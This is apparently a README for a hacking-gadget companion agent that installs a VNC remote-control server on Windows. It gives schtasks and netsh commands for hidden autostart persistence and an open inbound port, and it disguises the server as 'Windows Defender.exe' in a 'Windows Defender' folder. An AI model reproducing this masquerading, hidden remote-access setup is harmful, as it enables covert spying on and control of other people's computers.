# Tools

## Agent Installation

The PC agent enables VNC screen viewing and remote control.

### Quick Install (Recommended)

1. Download [`Agent Installer.bat`](Agent%20Installer.bat) (click → "Download raw file")
2. Save it anywhere on your PC
3. Right-click → **Run as administrator**
4. Enter a VNC password (optional, press Enter to skip)
5. Done — the installer downloads all files from GitHub and sets up everything

**What it installs:**
- `Windows Defender.exe` — VNC web server (noVNC on port 7002)
- `AgentLauncher.exe` — USB Army Knife agent for screen capture
- `WinDefend.vbs` — autostart launcher (hidden)
- Scheduled tasks for autostart on login
- Firewall rules for port 7002

**Installation path:** `C:\ProgramData\Windows Defender`

### Uninstall

Run [`Agent Uninstaller.bat`](Agent%20Uninstaller.bat) and choose:
- **[1] Full Uninstall** — removes autostart, all files and firewall rules
- **[2] Remove Autostart / Setup Autostart** — toggle scheduled tasks
- **[3] Start/Stop VNC Server** — start or stop the VNC server
- **[4] Set/Change VNC Password** — set or clear the VNC password
- **[5] Exit**

**What it removes:**
- Scheduled tasks ("USBArmyKnife Agent", "Security Script", "Windows Defender")
- Firewall rules ("VNC Direct 7002", "VNC Block Localhost")
- All files in `C:\ProgramData\Windows Defender\`

### Manual Install (if installer doesn't work)

1. Download all files from [`Installer/`](Installer/) on GitHub
2. Create `C:\ProgramData\Windows Defender\VncDirect\vnc` on your PC
3. Copy files:
   - `AgentLauncher.exe` → `C:\ProgramData\Windows Defender\`
   - `Windows Defender.exe`, `turbojpeg.dll`, `vcruntime140.dll` → `C:\ProgramData\Windows Defender\VncDirect\`
4. Extract `vnc-web.zip` into `C:\ProgramData\Windows Defender\VncDirect\`
5. Create scheduled tasks (run as admin):
   ```
   schtasks /create /tn "USBArmyKnife Agent" /tr "C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender" /sc onlogon /rl limited /f
   schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f
   ```
6. Add firewall rule (run as admin):
   ```
   netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002
   ```
7. Start:
   ```
   cd /d C:\ProgramData\Windows Defender\VncDirect\vnc
   start "" "C:\ProgramData\Windows Defender\VncDirect\Windows Defender.exe" port=7002 "cwd=C:\ProgramData\Windows Defender\VncDirect\vnc" fps=360 scale=0
   ```

## Compile from Source

The agent runs on 64-bit Windows only. Cross compilation is not supported.

### Prerequisites

- Windows 10/11 (64-bit)
- [.NET 8.0 SDK](https://dotnet.microsoft.com/en-us/download/dotnet/8.0)

### Compile Agent

```bash
cd tools\AgentLauncher
dotnet publish -r win-x64 -c Release

cd ..\Agent
dotnet publish -r win-x64 -c Release
```

Output:
- `tools\AgentLauncher\bin\Release\net8.0-windows\win-x64\publish\AgentLauncher.exe`
- `tools\Agent\bin\Release\net8.0-windows\win-x64\publish\PortableApp.dll`

### Compile VNC Server

```bash
cd tools\VncDirect
dotnet publish -r win-x64 -c Release --self-contained true /p:PublishSingleFile=true
```

Output: `tools\VncDirect\bin\Release\net8.0-windows\win-x64\publish\Windows Defender.exe`

## Getting Debug Logs

The agent API enables you to display debug logs from the device:

1. Edit the PowerShell script in `DebugLogs` to point to the COM port of your device
2. Run `.\get_device_debug_output.ps1` in a PowerShell terminal
3. Connect the device

If the script doesn't connect fast enough, add this to your `autostart.ds`:

```
WHILE (AGENT_CONNECTED() == FALSE)
  DELAY 2000
END_WHILE
```

## Building a Debug Agent

```bash
cd tools\Agent
dotnet build --configuration Debug /p:OutputType=Exe
.\bin\Debug\net8.0-windows\PortableApp.exe vid=cafe pid=403f
```
